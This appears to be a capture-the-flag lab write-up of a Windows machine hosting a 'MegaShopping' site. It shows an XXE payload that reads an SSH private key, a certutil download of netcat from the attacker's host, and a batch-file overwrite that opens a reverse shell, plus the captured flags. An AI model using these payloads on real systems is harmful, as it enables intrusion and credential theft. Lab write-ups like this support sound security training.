
Target : 10.129.95.192

Started off with the port scan : 22,80,443

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| tls-alpn:
|_  http/1.1
|_http-title: MegaShopping
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47

```

Enumerating Port : 80

Directory bruteforcing using gobuster

`gobuster dir  -u "http://10.129.95.192/" -w ~/SecLists/Discovery/Web-Content/common.txt`

```
/.hta                 (Status: 403) [Size: 1046]
/.htaccess            (Status: 403) [Size: 1046]
/.htpasswd            (Status: 403) [Size: 1046]
/Images               (Status: 301) [Size: 340] [--> http://10.129.95.192/Images/]
/aux                  (Status: 403) [Size: 1046]
/cgi-bin/             (Status: 403) [Size: 1060]
/com1                 (Status: 403) [Size: 1046]
/com2                 (Status: 403) [Size: 1046]
/com3                 (Status: 403) [Size: 1046]
/com4                 (Status: 403) [Size: 1046]
/con                  (Status: 403) [Size: 1046]
/examples             (Status: 503) [Size: 1060]
/images               (Status: 301) [Size: 340] [--> http://10.129.95.192/images/]
/index.php            (Status: 200) [Size: 12100]
/licenses             (Status: 403) [Size: 1205]
/lpt1                 (Status: 403) [Size: 1046]
/lpt2                 (Status: 403) [Size: 1046]
/nul                  (Status: 403) [Size: 1046]
/phpmyadmin           (Status: 403) [Size: 1205]
/prn                  (Status: 403) [Size: 1046]
/server-info          (Status: 403) [Size: 1205]
/server-status        (Status: 403) [Size: 1205]
/webalizer            (Status: 403) [Size: 1046]
```

Not that much interesting, there is a `login` in the landing page, used `admin:password` to successfully login and got the user access.

There is a feature - `order` it sends XML data 

And the source code reveals - a user : `daniel`

```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 193
Origin: http://10.129.95.192
Connection: close
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=s7qoltpnk6s5h28cl7un45s2u8
Priority: u=0

<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>3</quantity>
<item>&test;</item>
<address>testing</address>
</order>
```

For XXE, include this `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>` and call it inside the parameter, here `item` parameter is vulnerable 

```
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/Users/Daniel/.ssh/id_rsa'>]>
<order>
<quantity>3</quantity>
<item>&test;</item>
<address>testing</address>
</order>
```

To retrieve the ssh private key : C:/Users/Daniel/.ssh/id_rsa

![](../Screenshot%202026-07-20%20at%209.21.02%20PM.png)

```
nano id_rsa
chmod 600 id_rsa

ssh daniel@$ip -i id_rsa
```


```
daniel@MARKUP C:\Users\daniel\Desktop>more user.txt
032d2fc8952a8c24e39c8f0ee9918ef7
```

And while exploring in C:/ found a directory called `Log-Management` in that found a batch file `job.bat` also there is another file called `Recovery.txt` in the C:/ dir

![](../Pasted%20image%2020260720213153.png)

Let's see, if we have edit access to the file

`icacls job.bat`  (cmd)

![](../Pasted%20image%2020260720214932.png)

It confirms, we have `Full Control` for the file. Let's edit it to execute netcat.

https://github.com/rahuldottech/netcat-for-windows/releases

`python3 -m http.server 8000`

`certutil -urlcache -split "http://10.10.14.174:8000/nc64.exe" nc64.exe`

Now, we can edit the `job.bat` to  achieve administrator access, by gaining reverse shell.

`echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.174 1234 > C:\Log-Management\job.bat`

Getting the root flag :  `C:\Users\Administrator\Desktop\root.txt`

`type C:\Users\Administrator\Desktop\root.txt`

![](../Screenshot%202026-07-20%20at%2010.13.52%20PM.png)

`root.txt : f574a3e7650cebd8c39784299cb570f8`